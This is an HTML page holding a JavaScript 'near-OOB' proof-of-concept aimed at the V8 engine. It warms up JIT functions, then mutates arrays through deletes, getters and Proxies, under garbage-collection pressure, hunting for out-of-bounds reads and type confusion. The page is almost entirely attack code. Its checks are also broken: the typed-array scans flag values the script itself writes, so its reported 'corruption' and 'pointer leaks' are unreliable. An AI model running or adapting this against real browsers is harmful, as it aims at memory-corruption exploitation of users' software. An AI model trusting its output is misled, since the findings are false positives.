<!doctype html>
<meta charset="utf-8">
<title>V8 Aggressive Near-OOB PoC</title>

<h2>V8 Aggressive Near-OOB PoC</h2>
<pre id="log"></pre>

<script>
const log = m => {
    document.getElementById("log").textContent += m + "\n";
    console.log(m);
};

// =======================
// TARGET FUNCTIONS
// =======================
function vuln(a,i){ return a[i]+1.1; }
function target(a,i){ return a[i]+1.1; }

// =======================
// WARMUP JIT
// =======================
function warmup(){
    let arr = Array.from({length:50}, (_,i)=>i+0.5);
    for(let j=0;j<150000;j++){
        vuln(arr,j%50);
        target(arr,j%50);
    }
    return arr;
}

// =======================
// AGGRESSIVE MUTATION
// =======================
function mutate(arr){
    for(let i=0;i<10;i++) delete arr[i]; // lebih banyak holes
    arr.length = 10;
    arr[70] = 1.7976931348623157e+308; // max float64
    arr[2] = {x:1};
    Object.defineProperty(arr,3,{
        get(){ arr.push(Math.random()*1e5); return 1.1; }
    });
    return arr;
}

function breakAssumption(a){
    a = new Proxy(a,{
        get(t,p){
            if(p==="length") for(let i=0;i<5;i++) t.push(Math.random()*1e5);
            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5) t.push(Math.random()*1e5);
            return Reflect.get(t,p);
        },
        set(t,p,v){
            if(Math.random()<0.2) t.length += 5;
            return Reflect.set(t,p,v);
        }
    });
    return a;
}

// =======================
// TYPED ARRAYS
// =======================
let buf = new ArrayBuffer(0x4000);
let f64 = new Float64Array(buf);
let u32 = new Uint32Array(buf);
let u8  = new Uint8Array(buf);

// =======================
// GC PRESSURE
// =======================
function gcPressure(){
    let t=[];
    for(let i=0;i<200;i++) t.push(new ArrayBuffer(1024*1024));
}

// =======================
// CHECKS NEAR-OOB
// =======================
function checkArray(a){
    for(let i=0;i<a.length+100;i++){
        let v = a[i];
        if(typeof v!=="number" && typeof v!=="object" && v!==undefined){
            log("TYPE BREAK "+i+" "+v); return true;
        }
        if(typeof v==="number" && Math.abs(v)>1e12){
            log("POINTER LIKE "+v); return true;
        }
    }
    if(a[a.length+20]!==undefined){
        log("NEAR-OOB READ index "+(a.length+20)+" val="+a[a.length+20]);
        return true;
    }
    return false;
}

function checkTyped(){
    for(let i=0;i<f64.length;i++){
        let v = f64[i];
        if(!Number.isFinite(v)){ log("FLOAT CORRUPTION "+v); return true; }
        if(Math.abs(v)>1e12){ log("PTR LEAK "+v); return true; }
    }
    return false;
}

// =======================
// MAIN LOOP NEAR-OOB
// =======================
function run(){
    log("[*] warmup / JIT");
    let base = warmup();

    log("[*] starting aggressive near-OOB fuzzing...");
    for(let i=0;i<200000;i++){
        let arr = [...base];
        arr = mutate(arr);
        arr = breakAssumption(arr);

        vuln(arr,5);
        target(arr,4);

        f64[i % f64.length] = 1.7976931348623157e+308; // high float
        u32[i % u32.length] = 0xffffffff;
        u8[i % u8.length] = 0xff;

        if(i%10===0) gcPressure();

        if(checkArray(arr)){ log("ARRAY NEAR-OOB BREAK"); return; }
        if(checkTyped()){ log("TYPED ARRAY CORRUPTION"); return; }
        if(i%500===0) log("iter "+i);
    }
    log("[*] finished");
}

run();
</script>
